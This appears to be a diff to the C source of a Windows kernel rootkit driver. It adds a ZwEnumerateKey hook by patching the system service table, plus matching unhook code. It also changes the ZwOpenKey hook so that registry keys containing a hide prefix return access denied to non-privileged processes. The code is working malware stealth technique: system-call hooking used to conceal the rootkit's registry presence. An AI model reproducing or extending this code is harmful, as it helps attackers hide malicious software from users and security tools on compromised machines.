@@ -15,6 +15,7 @@ extern char *rulingProcess;
 NTQUERYDIRECTORYFILE		OldNtQueryDirectoryFile = NULL;
 NTCREATEFILE				OldNtCreateFile;
 ZWOPENKEY                   OldZwOpenKey;
+ZWENUMERATEKEY              OldNtEnumerateKey;
 
 BOOLEAN bHooked = FALSE;
 
@@ -59,6 +60,9 @@ VOID HookApis()
 
 //        OldZwOpenKey = SYSTEMSERVICE(ZwOpenKey);
 //        SYSTEMSERVICE( ZwOpenKey ) = HookZwOpenKey; 
+        
+        OldNtEnumerateKey = SYSTEMSERVICE(ZwEnumerateKey);
+        SYSTEMSERVICE( ZwEnumerateKey ) = HookNtEnumerateKey; 
 
 		bHooked = TRUE;
 		WPON();
@@ -83,13 +87,42 @@ VOID UnHookApis()
 
 		SYSCALL( currentAPI.NtCreateFileIndex ) = OldNtCreateFile;	
 		SYSCALL( currentAPI.NtQueryDirectoryFileIndex ) = OldNtQueryDirectoryFile;	
+		
 //        SYSTEMSERVICE( ZwOpenKey ) = OldZwOpenKey;
+        SYSTEMSERVICE( ZwEnumerateKey ) = OldNtEnumerateKey;        
 
 		bHooked = FALSE;
 		WPON();
 
 		LowerIRQLevel( irql );
 	}
+}
+
+NTSTATUS 
+  HookNtEnumerateKey(
+    IN HANDLE  KeyHandle,
+    IN ULONG  Index,
+    IN KEY_INFORMATION_CLASS  KeyInformationClass,
+    OUT PVOID  KeyInformation,
+    IN ULONG  Length,
+    OUT PULONG  ResultLength
+    )
+{
+  NTSTATUS rc;
+  
+  DbgPrint("ZwEnumerateKey");
+  
+  rc = OldNtEnumerateKey(
+       KeyHandle,
+       Index,
+       KeyInformationClass,
+       KeyInformation,
+       Length,
+       ResultLength
+    );
+    
+     
+  return rc;   
 }
 
 NTSTATUS 
@@ -101,20 +134,36 @@ HookZwOpenKey(
 {
         int rc;
         WCHAR buf[1024]; 
+        PEPROCESS currentEprocess = NULL;        
         
 //        DbgPrint("Entered HookZwOpenKey\n");
         rc=((ZWOPENKEY)(OldZwOpenKey)) (
 			phKey,
 			DesiredAccess,
 			ObjectAttributes );
+
+	    //sprawdzenie nazwy/pidu procesu => szybsze wyjscie ? ;)
+        currentEprocess = PsGetCurrentProcess();
+        if (IsPriviligedProcess( currentEprocess ) ) {
+	       return rc;
+        }
 			
+        if (ObjectAttributes->ObjectName && ObjectAttributes->ObjectName->Buffer) { 
+           DbgPrint( "objectName =  %S\n",ObjectAttributes->ObjectName->Buffer );
+           if (ObjectAttributes->ObjectName->Length >= wcslen(hidePrefixW.Buffer ) ) 
+              if (wcsstr(ObjectAttributes->ObjectName->Buffer,hidePrefixW.Buffer) != NULL) {
+//              if (RtlCompareMemory( ObjectAttributes->ObjectName->Buffer, hidePrefixW.Buffer, wcslen(hidePrefixW.Buffer )) == wcslen(hidePrefixW.Buffer) )  {
+//                 DbgPrint( "objectName =  %S\n",ObjectAttributes->ObjectName->Buffer );
+                 return STATUS_ACCESS_DENIED;              
+              }
+        }
 		
-//		getFullPath( buf, sizeof(buf), ObjectAttributes);
-//		DbgPrint("KEY: %S\n",buf);
+//        getFullPath( buf, sizeof(buf), ObjectAttributes);
+//        DbgPrint("KEY: %S\n",buf);
 		
 //		DbgPrint("rootkit: ZwOpenKey : rc = %x, phKey = %X\n", rc, *phKey);
       
-		return rc;
+        return rc;
 }
 
 //--------------------------------------------------------------------------
